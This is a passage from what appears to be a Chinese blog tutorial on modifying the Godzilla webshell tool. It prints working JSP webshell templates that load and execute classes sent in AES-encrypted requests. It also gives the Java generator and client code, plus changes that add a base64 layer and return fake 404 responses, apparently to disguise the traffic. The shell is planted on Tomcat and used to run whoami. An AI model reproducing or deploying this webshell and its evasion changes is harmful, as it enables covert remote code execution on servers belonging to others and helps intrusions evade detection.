(IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724334378-367cdd49-e8d9-459f-836f-0f41069efb56.png"
                      class="" title="img"
                >

<p> 已经没有分号</p>
<h2 id="修改请求包的加密方式（初学AES-2次base64）"><a href="#修改请求包的加密方式（初学AES-2次base64）" class="headerlink" title="修改请求包的加密方式（初学AES+2次base64）"></a>修改请求包的加密方式（初学AES+2次base64）</h2><p>我们现在默认使用的是AES+Base64，那我们初步学习，可以使用AES+Base64+Base64去了解加解密的步骤，以及如果我们要自主添加加解密的时候需要哪些步骤</p>
<h3 id="分析加密部分目录结构"><a href="#分析加密部分目录结构" class="headerlink" title="分析加密部分目录结构"></a>分析加密部分目录结构</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160549894.png"
                      class="" title="image-20250317160549894"
                > 

<p>这里面可以观摩下代码</p>
<h4 id="Generate-class"><a href="#Generate-class" class="headerlink" title="Generate.class"></a>Generate.class</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160621637.png"
                      class="" title="image-20250317160621637"
                > 

<p>大概了解代码可以知道这里是生成webshell文件的。里面的参数或者文件类型可以结合上面的shell.jsp以及base64code.bin相关文件了解</p>
<h4 id="JavaAesBase64-class"><a href="#JavaAesBase64-class" class="headerlink" title="JavaAesBase64.class"></a>JavaAesBase64.class</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161846907.png"
                      class="" title="image-20250317161846907"
                > 

<p>初始化的步骤</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161911906.png"
                      class="" title="image-20250317161911906"
                > 

<p>加解密的步骤。</p>
<p>可以思考一下是否可以在此加密地方多加一次base64加密</p>
<ul>
<li>客户端多base64一次，那服务端jsp代码解密的时候也要多解密一次base64。</li>
<li>服务端响应的base64多加密一次，客户端接收的时候解密decode也需要多解密一次。</li>
</ul>
<p><strong>所以服务端解密是依据客户端加密，客户端解密依据于服务端响应加密</strong> </p>
<h4 id="shell-jsp"><a href="#shell-jsp" class="headerlink" title="shell.jsp"></a>shell.jsp</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160725719.png"
                      class="" title="image-20250317160725719"
                > 

<p>shell.jsp非常简单，两个变量，是不是可以感觉名字有点像，base64Code.bin、base64GlobalCode.bin这两个，如果我们用的是base64的加密方式那是不是就感觉他们把两个文件跟上面两个参数替换了一下</p>
<h4 id="base64GlobalCode-bin"><a href="#base64GlobalCode-bin" class="headerlink" title="base64GlobalCode.bin"></a>base64GlobalCode.bin</h4><p>这里的bin文件我丢给gpt格式化了一下，好看一点</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义加密密钥和传递参数</span><br><span class="line">String xc = &quot;&#123;secretKey&#125;&quot;;</span><br><span class="line">String pass = &quot;&#123;pass&#125;&quot;;</span><br><span class="line">String md5 = md5(pass + xc);</span><br><span class="line"></span><br><span class="line">// 自定义类加载器，用于动态加载字节码</span><br><span class="line">class X extends ClassLoader &#123;</span><br><span class="line">    public X(ClassLoader z) &#123;</span><br><span class="line">        super(z);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义方法，用于将字节数组转换为Class对象</span><br><span class="line">    public Class&lt;?&gt; Q(byte[] cb) &#123;</span><br><span class="line">        return super.defineClass(cb, 0, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// AES 加密/解密方法</span><br><span class="line">public byte[] x(byte[] s, boolean m) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 获取AES加密实例</span><br><span class="line">        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        // 初始化加密或解密模式</span><br><span class="line">        c.init(m ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE,</span><br><span class="line">               new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));</span><br><span class="line">        // 执行加密或解密操作</span><br><span class="line">        return c.doFinal(s);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// MD5 哈希方法</span><br><span class="line">public static String md5(String s) &#123;</span><br><span class="line">    String ret = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 获取MD5实例</span><br><span class="line">        java.security.MessageDigest m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">        // 更新哈希值</span><br><span class="line">        m.update(s.getBytes(), 0, s.length());</span><br><span class="line">        // 转换为16进制字符串并大写</span><br><span class="line">        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base64 编码方法</span><br><span class="line">public static String base64Encode(byte[] bs) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; base64;</span><br><span class="line">    String value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 尝试使用 java.util.Base64</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (String) encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[]&#123;byte[].class&#125;)</span><br><span class="line">                                  .invoke(encoder, new Object[]&#123;bs&#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 如果 java.util.Base64 不可用，尝试使用 sun.misc.BASE64Encoder</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">            Object encoder = base64.newInstance();</span><br><span class="line">            value = (String) encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;)</span><br><span class="line">                                    .invoke(encoder, new Object[]&#123;bs&#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base64 解码方法</span><br><span class="line">public static byte[] base64Decode(String bs) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; base64;</span><br><span class="line">    byte[] value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 尝试使用 java.util.Base64</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                .invoke(decoder, new Object[]&#123;bs&#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 如果 java.util.Base64 不可用，尝试使用 sun.misc.BASE64Decoder</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            Object decoder = base64.newInstance();</span><br><span class="line">            value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                    .invoke(decoder, new Object[]&#123;bs&#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>了解代码除了定义 </p>
<p><strong>String xc &#x3D; “{secretKey}”;<br>String pass &#x3D; “{pass}”;<br>String md5 &#x3D; md5(pass + xc);</strong> </p>
<p>其余都是函数，所以可以理解上半部分的<strong>xxxGlobalCode.bin</strong> 就是用来写需要用到的函数调用的</p>
<h4 id="base64Code-bin"><a href="#base64Code-bin" class="headerlink" title="base64Code.bin"></a>base64Code.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class&lt;?&gt;) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法（可能用于触发某些逻辑）</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        response.getWriter().write(md5.substring(0, 16));</span><br><span class="line"></span><br><span class="line">        // 调用toString方法（可能用于触发某些逻辑）</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        response.getWriter().write(md5.substring(16));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以看出来是我们jsp运行时候的代码，它会接受请求的参数，并且调用相关加解密，最后返回给前端</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161635258.png"
                      class="" title="image-20250317161635258"
                > 

<h3 id="多加一次base64加密"><a href="#多加一次base64加密" class="headerlink" title="多加一次base64加密"></a>多加一次base64加密</h3><p>请求包的时候多加一次base64</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162234205.png"
                      class="" title="image-20250317162234205"
                > 

<p>根据前面学习的经验，修改的代码要在src目录下然后对应之前的目录，需要在shells.cryptions.目录下，然后我们新建一个JavaAesBase64_2目录，先写generate生成shell的代码</p>
<h4 id="Generate-java"><a href="#Generate-java" class="headerlink" title="Generate.java"></a>Generate.java</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package shells.cryptions.JavaAesBase64_2;</span><br><span class="line"></span><br><span class="line">import core.ApplicationContext;</span><br><span class="line">import core.ui.component.dialog.GOptionPane;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import util.Log;</span><br><span class="line">import util.functions;</span><br><span class="line"></span><br><span class="line">class Generate &#123;</span><br><span class="line">    private static final String[] SUFFIX = new String[]&#123;&quot;jsp&quot;, &quot;jspx&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    Generate() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) &#123;</span><br><span class="line">        byte[] data = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            InputStream inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/&quot; + shellName + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;GlobalCode.bin&quot;);</span><br><span class="line">            String globalCode = new String(functions.readInputStream(inputStream));</span><br><span class="line">            inputStream.close();</span><br><span class="line">            globalCode = globalCode.replace(&quot;&#123;pass&#125;&quot;, pass).replace(&quot;&#123;secretKey&#125;&quot;, secretKey);</span><br><span class="line">            inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/&quot; + shellName + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;Code.bin&quot;);</span><br><span class="line">            String code = new String(functions.readInputStream(inputStream));</span><br><span class="line">            inputStream.close();</span><br><span class="line">            Object selectedValue = GOptionPane.showInputDialog(null, &quot;suffix&quot;, &quot;selected suffix&quot;, 1, null, SUFFIX, null);</span><br><span class="line">            if (selectedValue != null) &#123;</span><br><span class="line">                String suffix = (String)selectedValue;</span><br><span class="line">                inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/shell.&quot; + suffix);</span><br><span class="line">                String template = new String(functions.readInputStream(inputStream));</span><br><span class="line">                inputStream.close();</span><br><span class="line">                if (suffix.equals(SUFFIX[1])) &#123;</span><br><span class="line">                    globalCode = globalCode.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">                    code = code.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                template = ApplicationContext.isGodMode() ? template.replace(&quot;&#123;globalCode&#125;&quot;, functions.stringToUnicode(globalCode)).replace(&quot;&#123;code&#125;&quot;, functions.stringToUnicode(code)) : template.replace(&quot;&#123;globalCode&#125;&quot;, globalCode).replace(&quot;&#123;code&#125;&quot;, code);</span><br><span class="line">                data = template.getBytes();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.error(e);</span><br><span class="line">        &#125;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) &#123;</span><br><span class="line">        return shells.cryptions.JavaAesBase64_2.Generate.GenerateShellLoder(&quot;&quot;, pass, secretKey, isBin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里其实就是遍历template下的模版然后组合起来而已，要修改的地方就是目录结构下我们调用的函数因为目录名字变了需要改一下</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162430268.png"
                      class="" title="image-20250317162430268"
                > 

<h4 id="JavaAesBase64-2-java"><a href="#JavaAesBase64-2-java" class="headerlink" title="JavaAesBase64_2.java"></a>JavaAesBase64_2.java</h4><p>添加加密方式修改这里</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163409108.png"
                      class="" title="image-20250317163409108"
                > 

<p>就会多一种加密方式</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163422068.png"
                      class="" title="image-20250317163422068"
                > 

<p>这里不贴完整代码了，太长了，就多加一个base64的客户端加密，直接贴图</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public byte[] encode(byte[] data) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] encoded_Aes = this.encodeCipher.doFinal(data);</span><br><span class="line">            byte[] encoded_Base64_1 = functions.base64Encode(encoded_Aes);</span><br><span class="line">            return (this.pass + &quot;=&quot; + URLEncoder.encode(functions.base64EncodeToString(encoded_Base64_1))).getBytes();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.error(e);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>根据原本的decode解密可以知道，decode的步骤是base64解密，再AES解密。所以我们修改的时候要把AES加密放在最前面，然后我们多加一步base64Encode()</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162805975.png"
                      class="" title="image-20250317162805975"
                > 

<p><strong>此时还没完</strong>！！！，前面说了客户端加密决定服务端接收参数的时候解密。所以我们服务端webshell接收的参数肯定也要多一次base64decode的解密</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163025906.png"
                      class="" title="image-20250317163025906"
                > 

<p>这里就是多加了一次。</p>
<h4 id="template-base64Code-bin"><a href="#template-base64Code-bin" class="headerlink" title="template&#x2F;base64Code.bin"></a>template&#x2F;base64Code.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = base64Decode(new String(data));  // 将 byte[] 转换为 String</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法，可能用于触发某些逻辑</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        //response.getWriter().write(md5.substring(0, 16));</span><br><span class="line">        response.setStatus(404);</span><br><span class="line">        // 调用toString方法，可能用于触发某些逻辑</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        //response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        //response.getWriter().write(md5.substring(16));</span><br><span class="line">        response.getWriter().write(&quot;My only love:&quot;+base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="templates-base64GlobalCode-bin"><a href="#templates-base64GlobalCode-bin" class="headerlink" title="templates&#x2F;base64GlobalCode.bin"></a>templates&#x2F;base64GlobalCode.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="template-shell-jsp"><a href="#template-shell-jsp" class="headerlink" title="template&#x2F;shell.jsp"></a>template&#x2F;shell.jsp</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!&#123;globalCode&#125;%&gt;&lt;%&#123;code&#125;%&gt;</span><br></pre></td></tr></table></figure></div>

<p>然后编译运行，看看能否连接。因为客户端与服务端加解密如果之前有差错是不能进行连接的。会出现连接失败的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163307114.png"
                      class="" title="image-20250317163307114"
                > 

<p>生成一个默认的木马放到tomcat的服务器下</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163457842.png"
                      class="" title="image-20250317163457842"
                > 

<p>我们设置了走burpsuite的代理。可以看看流量</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163536726.png"
                      class="" title="image-20250317163536726"
                > 

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MG1RVStTMXBGblR6M3R0VlRuQWdKVkQvYUJ3RDNOTlhMM1RmVEV4bzF3ZUt1NEtBaGhDdTZHbjFFUWZYMW05Zw%3D%3D </span><br></pre></td></tr></table></figure></div>

<p>这里是我们的参数，经过AES加密，然后两次base64然后url编码。AES是二进制的流量，所以如果我们base64解码之后是乱码就可以知道我们加密成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163729074.png"
                      class="" title="image-20250317163729074"
                > 

<h2 id="修改响应包的流量（404-响应参数初步修改）"><a href="#修改响应包的流量（404-响应参数初步修改）" class="headerlink" title="修改响应包的流量（404+响应参数初步修改）"></a>修改响应包的流量（404+响应参数初步修改）</h2><h3 id="404"><a href="#404" class="headerlink" title="404"></a>404</h3><p>我们现在的响应包是200状态码，我们可以尝试看看能不能让他为404</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163954583.png"
                      class="" title="image-20250317163954583"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164051025.png"
                      class="" title="image-20250317164051025"
                > 

<p>分析我们之前生成的代码这里是设置响应包的，响应包的参数前面是16位md5+加base64后的数据+16位md5</p>
<p>我们尝试添加状态码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">response.setStatus(404);</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164354248.png"
                      class="" title="image-20250317164354248"
                > 

<p>观察burpSuite的流量</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164441932.png"
                      class="" title="image-20250317164441932"
                > 

<p>这里查询了whoami我就给打码了，毕竟加密参数都给大家看到了。<strong>可以看到状态码是404</strong> </p>
<h3 id="响应参数初步修改"><a href="#响应参数初步修改" class="headerlink" title="响应参数初步修改"></a>响应参数初步修改</h3><p>前面分析我们知道，客户端的解密是依据服务端的响应包加密，那我们先修改jsp里面的响应包内容</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164736086.png"
                      class="" title="image-20250317164736086"
                >

<p> 先随便想一下，例如map形式，key:value <strong>My only love: 数据</strong></p>
<p>修改jsp代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165220213.png"
                      class="" title="image-20250317165220213"
                > 

<p>别的都注释掉了，就保留了404状态码和响应包的输出</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165156279.png"
                      class="" title="image-20250317165156279"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165326856.png"
                      class="" title="image-20250317165326856"
                > 

<p>这里没有数据的原因是我们客户端无法解密接收到的参数</p>
<p>修改客户端的代码</p>
<p>JavaAesBase64_2.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165415450.png"
                      class="" title="image-20250317165415450"
                > 

<p>客户端这里是可以从英文中看出寻找中间值，可以理解为我们之前就是md5+数据+md5，那提取中间的数据就好了，但是此时我们的是”My only love: 数据”，所以需要的是提取My only love:之后的字节</p>
<p>修改之后的样子,这里修改重要的点就是传输类型，接受的是byte[]，但是最后返回的是string，参考原来的subMiddleStr</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172555975.png"
